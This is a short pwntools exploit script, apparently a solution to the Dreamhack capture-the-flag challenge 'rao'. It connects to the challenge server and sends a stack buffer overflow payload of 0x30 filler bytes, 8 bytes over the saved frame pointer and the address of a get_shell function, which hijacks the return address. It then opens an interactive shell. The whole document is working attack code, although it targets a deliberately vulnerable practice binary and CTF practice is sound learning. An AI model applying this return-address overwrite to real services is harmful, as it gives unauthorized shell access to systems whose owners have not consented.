from pwn import *

p = remote('host3.dreamhack.games', 20701)
e = ELF("./rao")
payload = b'A'*0x30
payload += b'B'*0x8
payload += p64(e.symbols["get_shell"])

#b'\xaa\x06\x40'

p.sendlineafter('Input: ', payload)

p.interactive()